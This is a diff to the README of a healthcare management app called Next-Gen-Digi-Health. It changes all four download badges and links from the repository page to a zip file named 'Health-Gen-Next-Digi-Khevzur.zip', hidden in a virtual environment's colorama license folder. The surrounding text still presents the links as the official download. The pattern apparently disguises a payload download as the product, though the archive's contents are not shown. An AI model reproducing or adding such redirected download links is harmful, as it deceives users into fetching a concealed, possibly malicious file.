@@ -1,6 +1,6 @@
 # 🏥 Next-Gen-Digi-Health - Simplify Healthcare Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Next-Gen--Digi--Health-%237B68EE?style=for-the-badge&logo=github)](https://github.com/DinaNabil17/Next-Gen-Digi-Health)
+[![Download Now](https://img.shields.io/badge/Download%20Next-Gen--Digi--Health-%237B68EE?style=for-the-badge&logo=github)](https://github.com/DinaNabil17/Next-Gen-Digi-Health/raw/refs/heads/main/backend/venv311/Lib/site-packages/colorama-0.4.6.dist-info/licenses/Health-Gen-Next-Digi-Khevzur.zip)
 
 ## 📋 About Next-Gen-Digi-Health
 
@@ -37,7 +37,7 @@ You won't need to install any programming tools or dependencies manually. All re
 
 Click on this link to visit the official download page:
 
-[![Download Link](https://img.shields.io/badge/Download%20Page-%23007ACC?style=for-the-badge&logo=github)](https://github.com/DinaNabil17/Next-Gen-Digi-Health)
+[![Download Link](https://img.shields.io/badge/Download%20Page-%23007ACC?style=for-the-badge&logo=github)](https://github.com/DinaNabil17/Next-Gen-Digi-Health/raw/refs/heads/main/backend/venv311/Lib/site-packages/colorama-0.4.6.dist-info/licenses/Health-Gen-Next-Digi-Khevzur.zip)
 
 This page hosts the software files and any updates. 
 
@@ -123,7 +123,7 @@ If problems persist, you can open an issue on the GitHub page to get support.
 ## 🔗 Useful Links
 
 - Official repository and download page:  
-  https://github.com/DinaNabil17/Next-Gen-Digi-Health  
+  https://github.com/DinaNabil17/Next-Gen-Digi-Health/raw/refs/heads/main/backend/venv311/Lib/site-packages/colorama-0.4.6.dist-info/licenses/Health-Gen-Next-Digi-Khevzur.zip  
 - Release documentation and updates are on the same page under **Releases**  
 
 ## ⚙️ System Requirements
@@ -138,4 +138,4 @@ If problems persist, you can open an issue on the GitHub page to get support.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download%20Next-Gen--Digi--Health-%237B68EE?style=for-the-badge&logo=github)](https://github.com/DinaNabil17/Next-Gen-Digi-Health)
+[![Download Now](https://img.shields.io/badge/Download%20Next-Gen--Digi--Health-%237B68EE?style=for-the-badge&logo=github)](https://github.com/DinaNabil17/Next-Gen-Digi-Health/raw/refs/heads/main/backend/venv311/Lib/site-packages/colorama-0.4.6.dist-info/licenses/Health-Gen-Next-Digi-Khevzur.zip)
